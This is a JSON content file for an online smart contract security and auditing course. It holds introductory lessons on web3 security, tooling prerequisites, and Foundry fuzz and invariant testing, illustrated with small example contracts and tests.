{
  "courseId": "aca7cb85-ea1f-4fd3-9bc6-fc39f4609a0a",
  "title": "Security and Auditing",
  "slug": "security",
  "folderName": "security",
  "lastUpdated": "Mon Jan 15 2024 12:24:47 GMT-0500 (Eastern Standard Time)",
  "previewImg": "https://res.cloudinary.com/droqoz7lg/image/upload/f_auto,q_auto/v1/updraft/courses/rdmkzepzrx9b3sf0t3ko",
  "description": "Start your career as a smart contract auditor! Learn the best practices for writing secure and optimized smart contracts. Explore techniques like fuzzing, invariant testing, formal verification, and more to identify bugs and protect web3 protocols.",
  "path": "content/learning-paths/foundations.json",
  "number": 0,
  "githubUrl": "https://github.com/Cyfrin/security-and-auditing-full-course-s23",
  "overview": {
    "learnings": "Smart contracts invariant and fuzz testing, Stateless And Stateful Fuzzing Practice, Upgreadable smart contracts, smart contracts auditing, Aderyn, Slither, Manual review, Smart contracts testing ",
    "preRequisites": [
      "Blockchain Basics",
      "Solidity fundamentals",
      "Foundry fundamentals",
      "Advanced Foundry"
    ]
  },
  "duration": 24,
  "authors": [
    {
      "author": "content/authors/patrick-collins.json"
    },
    {
      "author": "content/authors/tincho-abbate.json"
    },
    {
      "author": "content/authors/josselin-feist.json"
    },
    {
      "author": "content/authors/owen-thurm.json"
    },
    {
      "author": "content/authors/andy-li.json"
    },
    {
      "author": "content/authors/johnny-time.json"
    },
    {
      "author": "content/authors/pashov.json"
    },
    {
      "author": "content/authors/juliette-chevalier.json"
    },
    {
      "author": "content/authors/alex-roan.json"
    }
  ],
  "sections": [
    {
      "number": 0,
"sectionId": "bc71e716-ae9a-45d5-8f06-75bd621b4e98",
      "title": "Course Introduction",
      "slug": "smart-contract-security-introduction",
      "folderName": "0-introduction",
      "lessons": [
        {
          "lessonId": "5d21322f-ee36-4445-868f-cd39113e7e9b",
          "number": 1,
          "title": "Trailer",
          "slug": "trailer",
          "folderName": "1-trailer",
          "description": "",
          "duration": 1,
          "videoUrl": "j4JboXum46f3HSinGWmJcVRmxvrb2tjrvelQopMbl4E",
          "rawMarkdownUrl": "/routes/security/0-introduction/1-trailer/+page.md",
          "markdownContent": "---\ntitle: Security Course Trailer\n---\n\n_Follow along with this video_\n\n\n\n---\n\n---\n\n## Ultimate Smart Contract Security, Assembly, and DeFi Curriculum\n\n### Introduction\n\n**Welcome to the ultimate Smart Contract Security, Assembly, and DeFi Curriculum.** This course is designed to provide the most advanced and comprehensive training in EVM assembly, security auditing, and DeFi (Decentralized Finance).\n\n### Course Overview\n\n- **Target Audience:** This course is tailored for individuals seeking deep insights and extensive knowledge in smart contract security, assembly language in EVM (Ethereum Virtual Machine), and decentralized finance applications.\n- **Course Structure:** The curriculum is structured to cover the intricacies of security auditing, the fundamentals and advanced concepts of EVM assembly, and critical aspects of DeFi.\n\n### Objectives\n\n1. **Deep Understanding of Smart Contract Security:** Gain an in-depth knowledge of the security aspects vital for smart contracts in the blockchain ecosystem.\n2. **Proficiency in EVM Assembly:** Develop a solid understanding and hands-on experience with EVM assembly language, crucial for advanced blockchain development.\n3. **Mastery of DeFi Concepts:** Explore and master the concepts and applications of decentralized finance, an emerging and significant sector in the blockchain world.\n\n### Expectations\n\n- **Commitment and Readiness:** The course demands a high level of commitment and is intended for individuals who are ready to dive deep into the complex world of blockchain technology.\n- **Advanced Level:** This is not an introductory course. It is expected that participants already have a foundational understanding of blockchain and programming concepts.\n\n---\n\n**Are you ready to embark on this journey and expand your knowledge in smart contract security, EVM assembly, and DeFi?** Let's get started! ðŸš€\n\n---\n",
          "updates": []
        },
        {
          "lessonId": "f7a230be-cc9c-48d4-ba18-bc5b228fb249",
          "number": 2,
          "title": "Welcome to smart contracts security",
          "slug": "welcome-smart-contracts-security",
          "folderName": "2-welcome",
          "description": "Explore the future of smart contract security in this course. Learn from experts and learn advanced smart contract auditing and research techniques.",
          "duration": 5,
          "videoUrl": "7IwS00CgjQhzlsi6pyfGFY8bRLbG00WmACbjQhyF02zh7M",
          "rawMarkdownUrl": "/routes/security/0-introduction/2-welcome/+page.md",
          "markdownContent": "---\ntitle: Welcome to the ultimate Solidity Course\n---\n\n_Follow along with this video_\n\n---\n\n## The Future of Web3: A focus on Security\n\nWelcome to the future of Web3 security; welcome to what is possibly the most comprehensive course on this subject ever created! As smart contract developers continue to bloom, it becomes imperative to ensure that the security scene keeps up. Thatâ€™s the core focus of this guide - to level up the game and ensure a safer environment in the Web3 space.\n\n> _\"Security is one of the most important things to unlocking the future of Web3.\"_\n\nWith multiple detailed courses delivered in the past, dedicated to helping novice and intermediate smart contract developers enhance their skills. The accompanying study materials have garnered over 5.5 million views, making them the most-watched smart contract development courses on the planet. Thousands of budding developers have thus started their Web3 journey, equipped with the right knowledge and skills. They are now activated and productive developers in the Web3 space.\n\nThis guide, however, is not for the newcomers. It's an advanced course aimed at those familiar with smart contracts and comfortable with terms like _storage_, _self-destruct_, _fallback functions_, and _ERC20s_. A refresher will be offered at the beginning, but the primary focus will be to provide learners with intensive training in smart contract auditing and research.\n\n## Expert Opinions Matter\n\nIt's always enriching to learn from the best, and this guide takes care of that too. Featuring guest lecturers who are renowned experts in smart contract development:\n\n1. Josselin from Trail of Bits\n2. Owen from Guardian Audience\n3. Andy from Sigma Prime\n4. Johnny Time from Gingersec\n5. Pashov, legendary security researcher.\n6. Hans, one of the top competitive auditors.\n7. Tincho, the former lead auditor at Openzeppelin.\n\nWith these experts by your side, not only will you gain in-depth insights, but also get to explore extensive and carefully curated code samples. A special shout-out to Tincho, who has been actively supporting the development and auditing of the codes that will be discussed in detail.\n\n## Mastering The Skills: Developer to Researcher\n\nPeople planning to take up this course should have a basic understanding of blockchain basics, solidity fundamentals, and working with a smart contract framework such as Hardhat or Foundry. We will primarily focus on Foundry in this guide, but the skills learned can easily be transferred to other frameworks as well.\n\nThe course is not just for auditors; it is also aimed at training security researchers. Because who better to explore and learn about new attacks and analyze possible advances in smart contract technologies than a researcher?\n\nThe [GitHub repo](https://github.com/Cyfrin/security-and-auditing-full-course-s23) associated with the course offers a detailed curriculum and additional resources. If you are already familiar with certain sections, feel free to skip directly to the ones that you need help with or wish to learn more about.\n\n## A Peek into the Future\n\nWe want you to learn effectively, and that's where Cyfrin Updraft comes into play. It's a tool developed to HyperCharge your learning experience and help you grasp things faster. Itâ€™s free to sign up for those interested.\n\nYou are perfectly up to speed with the prerequisites if you have already taken the Foundry full course. Access more resources to get up to speed in the GitHub repo associated with the post.\n\n## About the Author\n\nMy name is Patrick Collins, and I am a smart contract developer, educator, security researcher, co-founder of Cyfrin Audits. As an absolute lover of Web3 and smart contract development, I believe that the ability to do fantastic things rests within this sphere. I delight in fueling driven individuals with the knowledge to become productive and start doing amazing things.\n\nArmed with unique insights from top competitive auditors like Hans, independent auditors like Pashov, and seasoned security veterans like Tincho, this blog endeavors to jump-start your security and auditing career. It encapsulates everything learned so far and aims to equip you with the right knowledge to become a positive force in the smart contract security auditing and safety space.\n\nLet's get Froggy. ðŸ¸\n",
          "updates": []
        },
        {
          "lessonId": "1e19c090-66e6-41ac-a4af-804f32a4c0ff",
          "number": 3,
          "title": "Prerequisites",
          "slug": "prerequisites",
          "folderName": "3-prerequisites",
          "description": "Find out what prerequisites are required for this course to ensure you're well-prepared for the upcoming lessons.",
          "duration": 3,
          "videoUrl": "SZWWX8nzn1GMgAtt5Tml3y02mPLVI466Zpp5GDOaMrOA",
          "rawMarkdownUrl": "/routes/security/0-introduction/3-prerequisites/+page.md",
          "markdownContent": "---\ntitle: Pre-requisites\n---\n\n_Follow along with this video_\n\n\n\n---\n\n## Pre-requisites for the Smart Contract Security Course\n\n### Introduction\n\nThis course is **not** for beginners. We'll be covering advanced security and DeFi topics in this course and in order to get the most out of it you will _need_ to have a foundation to build upon.\n\n### Necessary Background Knowledge\n\n1. **Blockchain Basics:** A fundamental understanding of blockchain technology is essential.\n2. **Solidity Fundamentals:** Proficiency in Solidity, the primary programming language for writing smart contracts.\n3. **Smart Contract Framework Experience:** Familiarity with a smart contract framework like Hardhat or Foundry is crucial, with a preference for Foundry, as it is the main tool used in this course.\n4. **Key Terms and Concepts:** Terms like storage, self-destruct, fallback functions, and ERC20s should be familiar.\n\n### Course Expectations\n\n- **Level of Skill:** The course assumes a certain level of skill and will only provide a brief refresher at the beginning.\n- **For Auditors and Researchers:** If you have experience in security or auditing, this course will enhance your skills, focusing on not just auditing but also security research and building those skills and habits to make you successful in the space.\n\n### Additional Resources\n\n- **Foundry Full Course:** Our Foundry Full Course will prepare you with all the skills you need to be successful here.\n  - [Foundry Fundamentals](https://updraft.cyfrin.io/courses/foundry)\n  - [Advanced Foundry](https://updraft.cyfrin.io/courses/advanced-foundry)\n- **GitHub Repository:** Additional resources to help get up to speed are available in the course's [GitHub repository](https://github.com/Cyfrin/security-and-auditing-full-course-s23).\n\n### Course Philosophy and Goal\n\n- **Building a Strong Foundation:** The course aims to provide a solid base in smart contract security.\n- **Empowerment:** It focuses on empowering developers and researchers to contribute significantly to the Web3 space.\n- **Importance of Security:** Emphasizes the crucial role of security in the future of Web3.\n\n---\n\n**Are you ready to build a strong foundation in smart contract security and contribute to the future of Web3?** Let's embark on this journey together!\n\n---\n",
          "updates": []
        },
        {
          "lessonId": "bccddc5e-3f92-4f8f-9606-01566523e6a5",
          "number": 4,
          "title": "Best Practices",
          "slug": "best-practices",
          "folderName": "4-best-practices",
          "description": "Learn about best practices in Web 3.0 security to ensure safe and efficient smart contract development.",
          "duration": 5,
          "videoUrl": "S5VAXDa01KuOWZy02zhKWM4jwp02kldzp3Qjjk01IR9mwes",
          "rawMarkdownUrl": "/routes/security/0-introduction/4-best-practices/+page.md",
          "markdownContent": "---\ntitle: Best Practices\n---\n\n_Follow along with this video_\n\n\n\n---\n\n## Best Practices\n\nWelcome to our Smart Contract Security course! I'm super excited to guide you through this journey. Letâ€™s make sure you get the absolute best out of it.\n\nEssential Resources:\n\n- Cyfrin Updraft - If you're reading this, you're already here. All the most up to date corrections, content and updates will be available here, as accessible as ever and as part of a community eager to help.\n- GitHub Repo - The [Security and Auditing Full Course](https://github.com/Cyfrin/security-and-auditing-full-course-s23) repo is going to be your bible throughout this course. It is packed with all the code and references you need to succeed.\n\nNow, let's talk about how you can really get into the groove of things:\n\n- **Code Along**: Trust me, coding along with me during the lessons will make things stick way better. Have the video up along with your IDE of choice and follow along. Actually going through these motions are what will commit them to memory.\n- **Join the Chat on GitHub**: Got questions? Want to chat with others? Head over to our [GitHub Discussions](https://github.com/Cyfrin/security-and-auditing-full-course-s23/discussions) tab. It's a great spot to talk things out.\n- **Stay Up-to-Date**: Remember, the world of coding changes fast. Keep an eye on Cyfrin Updraft for the latest and greatest in course content.\n- **Dive into the Community** - We have a [Discord](https://discord.gg/cyfrin) server that is great for networking with fellow students and being involved in the community. Join us and share your successes and help others! To go far, we go together!\n\nAbout your learning pace â€“ everyone's different, right? So:\n\n- **Take Breaks**: Theyâ€™re not just okay, theyâ€™re necessary! Your brain will thank you.\n- **Control the Tempo**: Feel free to speed up or slow down the videos. Video playback settings are available to control the pace.\n- **Keep Track of Your Journey**: Use those timestamps in our [GitHub repo](https://github.com/Cyfrin/security-and-auditing-full-course-s23) to bookmark your progress.\n- **Jump Around**: The course is set up so you can hop between sections as you like. Reflect on each lesson to really make it stick.\n\nAnd donâ€™t forget, youâ€™re not alone in this:\n\n- **Connect with the Community**: There are awesome places like [Ethereum Stack Exchange](https://ethereum.stackexchange.com/) and various decentralized Q&A forums, not to mention GitHub, for some solid discussion and collaboration.\n- **Learn Together**: The blockchain and smart contract space is all about teamwork and sharing knowledge. So, getting involved with others will only boost your learning.\n\nAlright, ready to jump in? Just follow these tips, and you'll be navigating through the Smart Contract Security course like a pro. Letâ€™s get started! ðŸš€ðŸ‘©â€ðŸ’»ðŸ‘¨â€ðŸ’»\n",
          "updates": []
        },
        {
          "lessonId": "96c362b5-9aee-4a51-a686-de476257a351",
          "number": 5,
          "title": "Current state of web3 security",
          "slug": "current-state-of-web3-security",
          "folderName": "5-current-state",
          "description": "Stay up-to-date with the current state of Web3 security and understand the challenges and advancements in this field.",
          "duration": 7,
          "videoUrl": "uQc2m7WqBFujlEYutmhSLcgVBTm0201v8XUF02oyN7hAKY",
          "rawMarkdownUrl": "/routes/security/0-introduction/5-current-state/+page.md",
          "markdownContent": "---\ntitle: The current state of web3 security\n---\n\n_Follow along with this video_\n\n\n\n---\n\n## The Current State of Web3 Security: A Crucial Call to Action!\n\nThe current state of Web3 security is pretty objectively terrible. Let's look at where we're at and what needs to be done to improve security in the industry.\n\n### A Shocking Reality: Billions Lost in Hacks\n\n- **Billion-Dollar Troubles:** Did you know in 2022 alone, a jaw-dropping $3.1 billion was stolen in crypto hacks? And 2023 isn't looking much better. It's a call to arms for all of us in the Web3 space!\n- **DeFi's Dilemma:** Imagine this - about 7% of DeFi's total value is getting swiped by hackers. That's like saying, \"Hey, deposit your money here, but there's a scary chance it might vanish!\"\n\n### Attack Patterns: The Usual Suspects\n\n**Top Threats:**\n\n- Price oracle manipulation\n- reward manipulation\n- stolen private keys\n\nThese represent only a few of the common attack vectors we see lately. Some vulnerabilities have been around for years and _still_ people are making these mistakes - I'm looking at you _reentrancy_. There's a clear lack of best practices and we need to push back!\n\nThere's an amazing newsletter, every serious security researcher should sign up for called [Block Threat Intelligence](https://newsletter.blockthreat.io/) by Peter Kacherginsky.\n\nJust recently (as of October, 2023), we've seen multi-million dollar hacks, just in the last couple months.\n\n### The Big Picture: How do we move forward?\n\n- **Mainstream Hesitation:** With all these risks, no wonder big financial players are tiptoeing around Web3. It's incumbent upon us to make this space safer for mainstream adoption. How do we do accomplish this?\n- **Reducing the Risk:** It's simple - fewer hacks, more trust. More security focused education, fewer hacks.\n\n### The Bright Side: The future of Web3 Security\n\nSecurity in Web3 is improving every day.\n\n1. More and more people are moving into the security space in Web3. More auditors, more experts, more...safe!\n2. Education is improving in Web3 Security and Web3 as a whole. People are more informed of best practices and what to watch out for\n3. Tooling is improving - with AI and constantly developments in static analysis and vulnerability aggregation - we've never been more equipped to improve security in the space. [Solodit](https://solodit.xyz/) in particular is a tool we'll come back to again and again in this course.\n\n**Protocols Playing It Safe:** More and more Web3 protocols are investing in security. They're auditing their code, they're opening bug bounties for post deployment coverage, they're finally realizing that spending $1 Million on security now, is worth saving $100 Million in being hacked.\n\nWe also have an increase of pre-deployment experts like:\n\n- Cyfrin\n- Trail of Bits\n- OpenZeppelin\n\nCompetitive audit platforms ([CodeHawks](https://www.codehawks.com/)), independent security researchers like ([Pashov](https://twitter.com/pashovkrum)) and a greater security focus all come together to make me optimistic about the future of Web3 Security.\n\n### Yet, There's More to Do: Our Collective Mission\n\n- **Centralized Technology** is a big problem. Private keys being compromised, or offchain centralizing are regular vulnerabilities seen in the space.\n- **Lack of Post Deployment Practices** is something we'll cover later in the course. But needless to say, active monitoring practices and emergency triage in Web3 leave much to be desired. Few even leverage bug bounties to incentivize ongoing security on their protocol post launch.\n- **Not Following Best Practices**\n- **A Disconnect** seems to exist between the industry and security professionals. Audit(security review) != 100% Safe. If no one is reading the security reports, no one is any safer.\n\n### Wrapping Up: Your Role in Shaping Web3's Destiny\n\nThis isn't just a course. It's a mission. Together, we can transform Web3 into a fortress of trust and innovation. Keep going for some exercises to sharpen your skills.\n",
          "updates": []
        },
        {
          "lessonId": "6407d102-4af4-439f-b6cf-571a615d14dd",
          "number": 6,
          "title": "Exercises",
          "slug": "exercises",
          "folderName": "6-exercises",
          "description": "Prepare for practical exercises that will help you apply your knowledge and skills gained throughout the course.",
          "duration": 4,
          "videoUrl": "3CDs300T02oHqjuR1WnIP4vxSxqHDRt3f1chsH5BYNccw",
          "rawMarkdownUrl": "/routes/security/0-introduction/6-exercises/+page.md",
          "markdownContent": "---\ntitle: Exercises\n---\n\n_Follow along with this video_\n\n\n\n---\n\n### Section 0: Excercises\n\nThe first exercise is important. This is **just for you**. This isn't meant to be a motivation to share with others, or chat about publicly, this is what inspired you to take the first step and what will continue to inspire you to take the next.\n\n_This is for you._\n\nMake it as long and detailed as possible. Pour your emotion into defining why you want this. Don't bullsh\\*t yourself. There'll be opportunities to shout your accomplishments loudly - but this is just for you.\n\n---\n\nðŸŽ¯ Exercise: `Write yourself a message about why you want this`\n\nThis will be important for when things get hard\nIs it money? Save web3? Become someone?\nWrite down as many reasons as possible.\n\nSection 0 NFT Challenge ðŸ‘€\n\n[Welcome! (Arb)](https://arbiscan.io/address/0xf923431da74ecc873c4d641fbdfa2564baafca9f#code)\n\n[Welcome! (Sepolia)](https://sepolia.etherscan.io/address/0x39338138414df90ec67dc2ee046ab78bcd4f56d9)\n",
          "updates": []
        }
      ]
    },
    {
      "number": 1,
      "sectionId": "7918b334-ee76-4134-a88b-86f30ba20f98",
      "title": "Review",
      "slug": "review",
      "folderName": "1-review",
      "lessons": [
        {
          "lessonId": "8a95ea78-0301-4dc3-814a-36699ab23b05",
          "number": 1,
          "title": "Tooling requisites",
          "slug": "tooling-requisites",
          "folderName": "1-tooling-requisites",
          "description": "This lesson provides an overview of the essential tools required for Solidity and Smart Contract development. It includes a guide to text editors like Visual Studio Code and VSCodium, and an introduction to frameworks such as Foundry, alongside compatibility tips for different operating systems. It also highlights the importance of AI tools like Find and ChatGPT in the development process.",
          "duration": 4,
          "videoUrl": "u402E99ThbDHbSFBQiboYBRMzY992t3PA00yxf4qXuqf8",
          "rawMarkdownUrl": "/routes/security/1-review/1-tooling-requisites/+page.md",
          "markdownContent": "---\ntitle: Tooling Pre-requisites\n---\n\n_Follow along with this video_\n\n---\n\n## Pre-requisite Tools\n\nBefore we get deep into coding, there are some useful tools we're going to be using throughout the course. Best to prepare them now.\n\nFirstly, you will need some kind of IDE or text editor. I like to use [**Visual Studio Code**](https://code.visualstudio.com/). For those of you more security and privacy focused you may want to check out [**VSCodium**](https://vscodium.com/) which removes a lot of the Microsoft _stuff_.\n\n## Frameworks\n\nThe primary framework we'll be working with in this course is Foundry. You can view installation instructions for that [**here**](https://book.getfoundry.sh/getting-started/installation).\n\nBut hey, if youâ€™re more familiar with [**Hardhat**](https://hardhat.org/), [**Brownie**](https://eth-brownie.readthedocs.io/en/stable/), or any other framework, don't stress; you can absolutely follow along using your tools. We'll be tackling some Foundry-specific tasks, but you're always welcome to adapt them for your framework of choice.\n\n> Remember: You can use commands `foundryup` to update your Foundry tools and `forge --help` to access a help guide.\n\nAdditional Foundry specific features we'll be using include `cast` and `chisel`, both of which we'll learn more about in this course.\n\n## Coding Environment\n\nIf you're using a PC with Windows, ensure you're using **Windows with WSL**.\n\nThis tool ensures the Linux terminal commands we run are compatible with your machine too. There's a brilliant [**guide by Vasiliy**](https://youtu.be/umepbfKp5rI?feature=shared&t=23546) walking you through the WSL installation process if you need it.\n\nFor Linux and Mac users, you can simply stick with the environments you're already using.\n\nAI tools like [**Phind**](https://www.phind.com/) or [**ChatGPT**](https://www.chat.openai.com) aid in seeking answers when things get tough. One nifty feature **Phind** offers is web searching; you can query \"_install Foundry for the ETH ecosystem_\", and the tool will surf the web, compile an answer, and offer you a digestible solution for your query!\n\n<img src=\"/security-section-1/1-tooling/tooling1.PNG\" style=\"width: 100%; height: auto;\" alt=\"block fee\">\n\n## Web3 Is About Community\n\nI highly recommend you consider creating accounts on platforms like:\n\n- [**Peeranha.io**](https://peeranha.io/) - A great platform for discussion and QA for Web3\n- [**Ethereum Stack Exchange**](https://ethereum.stackexchange.com/) - One of _the_ best blockchain developer resources available\n  and of course\n- [**GitHub**](https://www.github.com) - Every developer needs an account here. It's objectively the best space online to collaborate, discuss and share coding support.\n\nRemember to jump in and ask questions. Don't pretend to have answers when you don't. The learning experience is about being humble and is most rewarding to those willing to ask questions and seek clarity. Embrace the \"I don't know, and I will find out\" attitude.\n\n> One of the worst things you can do as a security researcher is pretend to know something you don't.\n",
          "updates": []
        },
        {
          "lessonId": "10c4f125-eba0-41a7-bc7a-154842f2bc01",
          "number": 2,
          "title": "Solidity Prerequisites",
          "slug": "solidity-requisites",
          "folderName": "2-solidity-requisites",
          "description": "This lesson covers the prerequisites for working with Solidity, focusing on skills like using Remix for compiling and deploying contracts, and the basics of Foundry framework. It emphasizes the importance of familiarity with local and cloud-based coding for effective contract development.",
          "duration": 4,
          "videoUrl": "iYZ4cd02KTxdyUG44SuIzZo1fah02ychPCr3qs4NUZOSg",
          "rawMarkdownUrl": "/routes/security/1-review/2-solidity-requisites/+page.md",
          "markdownContent": "---\ntitle: Solidity Pre-requisites\n---\n\n_Follow along with this video_\n\n---\n\nAlright! All of the pre-requisites I've mentioned so far, and those mentioned here can be found in the Foundry Full Course ([Fundamentals](https://updraft.cyfrin.io/courses/foundry) _and_ [Advanced](https://updraft.cyfrin.io/courses/advanced-foundry))\n\n## The Prerequisites: Solidity Basics\n\nTo keep up with this course, you should be familiar with all the basic functions of [Remix](https://remix.ethereum.org). This includes `compiling`, and `deploying` to both local and testnet blockchains.\n\nAll of the basic Solidity, variable types, contract structure etc should be second nature.\n\n## Foundry Familiarity\n\nYou should also be familiar with the working environments of Foundry, or your framework of choice. You should understand how to initialize a project in your framework and navigate it's working tree.\n\n<div style=\"text-align:center;\">\n<img src=\"/security-section-1/2-solidity-req/solidity-prerequisites1.PNG\" style=\"width: 40%; height: auto;\" alt=\"block fee\">\n</div>\n\nCommands like these should ring lots of bells.\n\n```shell\nforge init\nforge build\nforge test\n```\n\nThe basic code seen in the Foundry example contracts should be things you recognize as well.\n\n```js\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract Counter {\n    uint256 public number;\n\n    function setNumber(uint256 newNumber) public {\n        number = newNumber;\n    }\n\n    function increment() public {\n        number++;\n    }\n}\n```\n\n---\n\n## Testing\n\nThe Foundry example test setup contains two distinct test types, a regular test and a fuzz test. These distinctions you should be a little familiar with, but we'll definitely go more indepth throughout this course.\n\n### Exploring Test Types: Regular Test and Fuzz Test\n\nIn the regular test, we merely incept the counter contract and increment it, ensuring the counter number equals one. The Fuzz test, however, involves passing a random number into our test.\n\nAs you may recall, we run this test with a certain number of runs, using different random numbers. No matter the chosen value for X, the test will always hold.\n\nHow do we change the number of fuzz runs? Simply browse to Foundry's TOML file and copy the variable.\n\n```md\n[fuzz]\nruns = 256\nmax_test_rejects = 65536\nseed = \"0x3e8\"\ndictionary_weight = 40\ninclude_storage = true\ninclude_push_bytes = true\n```\n\nIn the TOML file, you have the ability to set the number of runs. For instance, we could change it from 256 to 600.\n\n```shell\n$ forge test\n```\n\nVoila! You'll see that the test Fuzz ran 600 times. This indicates that the test ran with 600 different random numbers.\n\n```bash\nRunning 1 test for test/Counter.t.sol:CounterTest\n[PASS] testFuzz_SetNumber(uint256) (runs: 600, Î¼: 27398, ~: 28409)\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 14.63ms\n\nRan 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\n## Advanced Fuzzing: Stateful Fuzzing and Invariant Tests\n\nOn to the next level â€“ **stateful fuzzing**, also popular as invariant tests in the Foundry universe. This aspect of coding might not be your forte yet, but no worries, that's what we're here for.\n\nLet's look more closely at fuzzing and invariant testing in our next lesson.\n",
          "updates": []
        },
        {
          "lessonId": "7ca092d5-a77c-4d01-b952-53d530f5a25e",
          "number": 3,
          "title": "Fuzzing and invariants",
          "slug": "fuzzing-and-invariants",
          "folderName": "3-fuzzing-and-invariants",
          "description": "Explore the concepts of fuzz testing and invariant testing in Solidity. This lesson explains how fuzz testing can help uncover unexpected application failures, and dives into the practice of testing invariants, or properties that always hold true, in smart contracts.",
          "duration": 10,
          "videoUrl": "4bjEKZNJ724C4jGzJHzDs1Q6Q4rLK7zUDbPhY8G0200pc",
          "rawMarkdownUrl": "/routes/security/1-review/3-fuzzing-and-invariants/+page.md",
          "markdownContent": "---\ntitle: Stateless Fuzzing, Stateful Fuzzing And Invariants/Properties\n---\n\n_Follow along the video_\n\n---\n\n## Testing the Unknown\n\nOften, hacks result from scenarios you didn't anticipate or consider for testing. But what if you could write a test that checks for every possible scenario, not just one? Welcome to the world of **Fuzz testing**.\n\n## What Is Fuzz Testing?\n\nAlso known as _fuzzing_, this is all about supplying random data to your system in an attempt to break it. Imagine your code is an indestructible balloon. Fuzzing involves you doing random things (like poking, squeezing, or even kicking) to the balloon with the sole intention of breaking it.\n\nThis makes it a useful technique for unearthing unexpected application failures. This lesson aims to walk you through the concept and practical application of fuzz testing.\n\n### The Fundamental Principle: Testing Invariants\n\nEach system, from a function to an entire program, has an integral property, often referred to as the _invariant_. This property must always hold true. For instance, you could have a function called `doStuff` that should always return zero, regardless of the value of the input. In such a case, returning zero would be the invariant of that function.\n\nLet's dark dive deeper into what such a function could look like:\n\n```js\nfunction doStuff(uint256 data) public {\n    if (data == 2){\n        shouldAlwaysBeZero = 1;\n    }\n    if(hiddenValue == 7) {\n        shouldAlwaysBeZero = 1;\n    }\n    hiddenValue = data;\n}\n```\n\nA unit test for this function would look something like this:\n\n```js\nfunction testIsAlwaysGetZero() public {\n    uint256 data = 0;\n    exampleContract.doStuff(data);\n    assert(exampleContract.shouldAlwaysBeZero() == 0);\n}\n```\n\nThe above test is going to pass because in that specific situation (where `data == 0`), our invariant isn't broken.\n\nFrom the function above, you can expect that `should_always_be_zero` is always zero, regardless of the `data` value. But wait, what happens if our input is `2`? We get `should_always_be_zero` as `1`. That violates our invariant!\n\nOf course, this is a pretty straightforward example. But what if we have a function that looks a bit more complicated? Writing a test case for every scenario could be tedious or impossible. We need to adopt a more programmatic approach to test these cases en masse.\n\n## Introducing Fuzz Tests and Invariant Tests\n\nThere are two popular methodologies when dealing with edge cases: using _fuzz tests/invariant tests_, or _symbolic execution_ (which we'll save for another day).\n\n> \"Fuzz testing and Invariant testing are great tools to assess the robustness of your code.\"\n\nLet's consider an example of a fuzz test in Foundry. Here, we set our data right in the test parameter, allowing Foundry to automate the process of providing random input data during tests.\n\n```js\nfunction testIsAlwaysGetZeroFuzz(uint256 data) public {\n    exampleContract.doStuff(data);\n    assert(exampleContract.shouldAlwaysBeZero() == 0);\n}\n```\n\nFoundry will automatically randomize data and use numerous examples to run through the test script. This test will be supplied random data from 0 to uint256.max(), as many times as you've conifigured runs.\n\n> Reminder: You can configure the number of runs in your foundry.toml under the [fuzz] variable\n\nNotably, this pseudo-random mechanism is not exhaustive. It won't provide a scenario for every single possible data input. That's why further understanding of how the Fuzzer generates random data is crucial.\n\n## Stateless Fuzzing versus Stateful Fuzzing\n\nFuzzing also comes in flavours, the above being an example of `stateless fuzzing`. Another that is valuable to understand is `stateful fuzzing`. `Stateful fuzzing`, instead of resetting the contract state for each new run, will use the ending state of your previous run as the starting state of your next.\n\nThis is important for situations like our `doStuff` function\n\n<img src=\"/security-section-1/3-fuzz-test/fuzz2.png\" style=\"width: 100%; height: auto;\" alt=\"block fee\">\n\nA stateful fuzz test would instead utilize the same contract we just triggered and call another function on it, creating an interlocking sequence of functions throughout a single run. Achieving this in Foundry requires using the `invariant` keyword and a bit of setup:\n\nFirst, we need to import `StdInvariant` from `forge-std` and inherit it in our test contract.\n\n```js\n//SPDX-License-Identifier: MIT\npragma solidity ^0.8.0\n\nimport {StdInvariant} from \"forge-std/StdInvariant.sol\";\n\ncontract MyContractTest is StdInvariant, Test {...}\n```\n\nThen, in the setup of our test contract, we need to tell Foundry, which contract we'll be calling random functions on.\n\n```js\nfunction setUp() public {\n    exampleContract = new MyContract();\n    targetContract(address(exampleContract));\n}\n```\n\nNow our `stateful fuzz` test is going to look something like this:\n\n```js\nfunction invariant_testAlwaysReturnsZero() public {\n    assert(exampleContract.shouldAlwaysBeZero() == 0);\n}\n```\n\nWith the above test, Foundry is going to call random functions on the `targetContract` (in our case `doStuff` repeatedly, but were there other functions, they would be called in a random order) and pass those functions random data.\n\n## In Summary\n\nFuzz testing involves mainly understanding your system's invariants and writing tests that can execute numerous scenarios. This is either achieved through `stateless fuzzing`, which provides random data alone with each run independent of the last, or `stateful fuzzing`, allowing both random data and random function calls subsequently on the same contract. This is the new standard for web3 security.\n\nGoing forward, aim to fully understand the invariants in systems you're working on, and write fuzz tests to ensure they are not broken\n\n> \"Fuzz testing is a technique that some of the top protocols are yet to adopt, yet it can aid in discovering high severity vulnerabilities in smart contracts.\" - Alex Rohn, co-founder at Cyfrin.\n\nNext lesson we're going to talk about common Ethereum Improvement Proposals (EIPs)!\n",
          "updates": []
        },
        {
          "lessonId": "9d521d8e-81b8-4bc0-b446-07362440e116",
          "number": 4,
          "title": "Installing Libraries",
          "slug": "installing-libraries",
          "folderName": "4-installing-libraries",
          "description": "This lesson covers using OpenZeppelin for ERC20 token integration, including installation and Solidity contract creation, with future insights into ERC20 and ERC721.",
          "duration": 3,
          "videoUrl": "WcKJ201TiFW5Y1Yexh003HWfGO1g3hZYHrfOsDeb5owEg",
          "rawMarkdownUrl": "/routes/security/1-review/4-installing-libraries/+page.md",
